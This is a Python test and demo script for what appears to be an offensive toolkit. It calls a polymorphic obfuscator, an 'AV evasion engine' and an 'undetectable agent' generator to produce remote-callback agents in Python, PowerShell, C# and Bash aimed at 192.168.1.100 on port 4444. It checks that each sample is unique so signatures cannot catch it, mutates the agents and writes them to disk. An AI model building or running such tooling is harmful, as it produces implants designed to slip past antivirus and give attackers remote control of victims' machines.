#!/usr/bin/env python3
"""
Polymorphic Obfuscation Test & Demo Script
Tests all polymorphic obfuscation features
"""

import sys
import os

# Add current directory to path
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from polymorphic_obfuscator import PolymorphicObfuscator, AgentMutator
from av_evasion_engine import AVEvasionEngine
from advanced_agent_generator import generate_undetectable_agent

def print_header(text):
    """Print formatted header"""
    print("\n" + "="*70)
    print(f"  {text}")
    print("="*70 + "\n")

def print_section(text):
    """Print formatted section"""
    print(f"\n--- {text} ---\n")

def test_basic_polymorphic_generation():
    """Test basic polymorphic generation"""
    print_header("🔄 Test 1: Basic Polymorphic Generation")
    
    obfuscator = PolymorphicObfuscator(obfuscation_level='high')
    
    # Python
    print_section("Python Agent")
    py_agent = obfuscator.obfuscate_python("", "192.168.1.100", 4444)
    print(f"✅ Generated Python agent")
    print(f"   Size: {len(py_agent['code'])} bytes")
    print(f"   Encryption: {py_agent['encryption_method']}")
    print(f"   Techniques: {', '.join(py_agent['techniques'][:3])}...")
    
    # PowerShell
    print_section("PowerShell Agent")
    ps_agent = obfuscator.obfuscate_powershell("192.168.1.100", 4444)
    print(f"✅ Generated PowerShell agent")
    print(f"   Size: {len(ps_agent['code'])} bytes")
    print(f"   Techniques: {', '.join(ps_agent['techniques'][:3])}...")
    
    # C#
    print_section("C# Agent")
    cs_agent = obfuscator.obfuscate_csharp("192.168.1.100", 4444)
    print(f"✅ Generated C# agent")
    print(f"   Namespace: {cs_agent['namespace']}")
    print(f"   Class: {cs_agent['class']}")
    print(f"   Size: {len(cs_agent['code'])} bytes")
    print(f"   Compile: {cs_agent['compile_command']}")
    
    # Bash
    print_section("Bash Agent")
    bash_agent = obfuscator.obfuscate_bash("192.168.1.100", 4444)
    print(f"✅ Generated Bash agent")
    print(f"   Size: {len(bash_agent['code'])} bytes")
    print(f"   Encoding: {bash_agent['encoding']}")
    
    return True

def test_uniqueness():
    """Test that each generation is unique"""
    print_header("🎲 Test 2: Uniqueness Verification")
    
    obfuscator = PolymorphicObfuscator(obfuscation_level='high')
    
    # Generate 5 Python agents with same parameters
    agents = []
    for i in range(5):
        agent = obfuscator.obfuscate_python("", "192.168.1.100", 4444)
        agents.append(agent['code'])
        print(f"✅ Generated Agent {i+1}: {len(agent['code'])} bytes, "
              f"Encryption: {agent['encryption_method']}")
    
    # Check uniqueness
    print_section("Uniqueness Analysis")
    unique_count = len(set(agents))
    if unique_count == len(agents):
        print(f"✅ SUCCESS: All {len(agents)} agents are unique!")
    else:
        print(f"❌ FAILED: Only {unique_count}/{len(agents)} are unique")
        return False
    
    # Check different encryption methods
    encryption_methods = set()
    for _ in range(10):
        agent = obfuscator.obfuscate_python("", "192.168.1.100", 4444)
        encryption_methods.add(agent['encryption_method'])
    
    print(f"✅ Found {len(encryption_methods)} different encryption methods: "
          f"{', '.join(encryption_methods)}")
    
    return True

def test_obfuscation_levels():
    """Test different obfuscation levels"""
    print_header("📊 Test 3: Obfuscation Levels")
    
    levels = ['low', 'medium', 'high', 'extreme']
    
    for level in levels:
        print_section(f"Level: {level.upper()}")
        obfuscator = PolymorphicObfuscator(obfuscation_level=level)
        agent = obfuscator.obfuscate_python("", "192.168.1.100", 4444)
        print(f"✅ Generated with '{level}' level")
        print(f"   Size: {len(agent['code'])} bytes")
        print(f"   Techniques: {len(agent['techniques'])} applied")

    return True

def test_av_evasion_integration():
    """Test integration with AV Evasion Engine"""
    print_header("🛡️ Test 4: AV Evasion Engine Integration")
    
    engine = AVEvasionEngine()
    
    # Python
    print_section("Python Agent via AV Engine")
    py_agent = engine.generate_polymorphic_agent("192.168.1.100", 4444, 'python', 'high')
    print(f"✅ Generated Python agent")
    print(f"   Size: {len(py_agent['code'])} bytes")
    
    # PowerShell
    print_section("PowerShell Agent via AV Engine")
    ps_agent = engine.generate_polymorphic_agent("192.168.1.100", 4444, 'powershell', 'high')
    print(f"✅ Generated PowerShell agent")
    print(f"   Size: {len(ps_agent['code'])} bytes")
    
    # C#
    print_section("C# Agent via AV Engine")
    cs_agent = engine.generate_polymorphic_agent("192.168.1.100", 4444, 'csharp', 'high')
    print(f"✅ Generated C# agent")
    print(f"   Namespace: {cs_agent['namespace']}")
    print(f"   Class: {cs_agent['class']}")
    
    return True

def test_advanced_agent_generator():
    """Test integration with Advanced Agent Generator"""
    print_header("⚙️ Test 5: Advanced Agent Generator Integration")
    
    print_section("With Polymorphic Obfuscation")
    agent_poly = generate_undetectable_agent(
        "192.168.1.100", 
        4444, 
        'python',
        use_polymorphic=True,
        obfuscation_level='high'
    )
    print(f"✅ Generated polymorphic agent")
    print(f"   Size: {len(agent_poly['code'])} bytes")
    print(f"   Techniques: {', '.join(agent_poly['techniques'][:3])}...")
    
    print_section("Without Polymorphic Obfuscation (Legacy)")
    agent_legacy = generate_undetectable_agent(
        "192.168.1.100", 
        4444, 
        'python',
        use_polymorphic=False
    )
    print(f"✅ Generated legacy agent")
    print(f"   Size: {len(agent_legacy['code'])} bytes")
    print(f"   Features: {', '.join(agent_legacy['features'])}")
    
    return True

def test_agent_mutation():
    """Test agent mutation"""
    print_header("🧬 Test 6: Agent Mutation")
    
    obfuscator = PolymorphicObfuscator(obfuscation_level='high')
    mutator = AgentMutator()
    
    # Generate original
    print_section("Original Agent")
    original = obfuscator.obfuscate_python("", "192.168.1.100", 4444)
    print(f"✅ Generated original: {len(original['code'])} bytes")
    
    # Create mutations
    print_section("Mutations")
    for i, rate in enumerate([0.3, 0.5, 0.7], 1):
        mutated = mutator.mutate_agent(original['code'], 'python', rate)
        print(f"✅ Mutation {i} (rate {rate}): {len(mutated)} bytes")
    
    return True

def test_file_generation():
    """Test generating agents to files"""
    print_header("💾 Test 7: File Generation")
    
    obfuscator = PolymorphicObfuscator(obfuscation_level='high')
    output_dir = "test_agents"
    
    # Create output directory
    if not os.path.exists(output_dir):
        os.makedirs(output_dir)
        print(f"✅ Created directory: {output_dir}")
    
    # Generate Python agents
    print_section("Generating Agent Files")
    for i in range(3):
        agent = obfuscator.obfuscate_python("", "192.168.1.100", 4444)
        filename = os.path.join(output_dir, f"agent_{i+1}.py")
        
        with open(filename, 'w') as f:
            f.write(agent['code'])
        
        print(f"✅ Generated: {filename} ({len(agent['code'])} bytes)")
    
    # Generate PowerShell agent
    ps_agent = obfuscator.obfuscate_powershell("192.168.1.100", 4444)
    ps_filename = os.path.join(output_dir, "agent.ps1")
    with open(ps_filename, 'w') as f:
        f.write(ps_agent['code'])
    print(f"✅ Generated: {ps_filename} ({len(ps_agent['code'])} bytes)")
    
    # Generate C# agent
    cs_agent = obfuscator.obfuscate_csharp("192.168.1.100", 4444)
    cs_filename = os.path.join(output_dir, f"{cs_agent['class']}.cs")
    with open(cs_filename, 'w') as f:
        f.write(cs_agent['code'])
    print(f"✅ Generated: {cs_filename} ({len(cs_agent['code'])} bytes)")
    
    print(f"\n📁 All test agents saved to: {output_dir}/")
    
    return True

def main():
    """Run all tests"""
    print_header("🔬 Polymorphic Obfuscation - Complete Test Suite")
    
    tests = [
        ("Basic Generation", test_basic_polymorphic_generation),
        ("Uniqueness", test_uniqueness),
        ("Obfuscation Levels", test_obfuscation_levels),
        ("AV Evasion Integration", test_av_evasion_integration),
        ("Advanced Agent Generator", test_advanced_agent_generator),
        ("Agent Mutation", test_agent_mutation),
        ("File Generation", test_file_generation),
    ]
    
    results = []
    
    for test_name, test_func in tests:
        try:
            result = test_func()
            results.append((test_name, result))
        except Exception as e:
            print(f"\n❌ ERROR in {test_name}: {str(e)}")
            import traceback
            traceback.print_exc()
            results.append((test_name, False))
    
    # Summary
    print_header("📊 Test Results Summary")
    
    passed = sum(1 for _, result in results if result)
    total = len(results)
    
    for test_name, result in results:
        status = "✅ PASSED" if result else "❌ FAILED"
        print(f"{status}: {test_name}")
    
    print(f"\n{'='*70}")
    print(f"  Total: {passed}/{total} tests passed")
    
    if passed == total:
        print(f"  🎉 ALL TESTS PASSED!")
    else:
        print(f"  ⚠️ Some tests failed")
    
    print(f"{'='*70}\n")
    
    return passed == total

if __name__ == "__main__":
    try:
        success = main()
        sys.exit(0 if success else 1)
    except KeyboardInterrupt:
        print("\n\n⚠️ Tests interrupted by user")
        sys.exit(1)
    except Exception as e:
        print(f"\n\n❌ Fatal error: {str(e)}")
        import traceback
        traceback.print_exc()
        sys.exit(1)
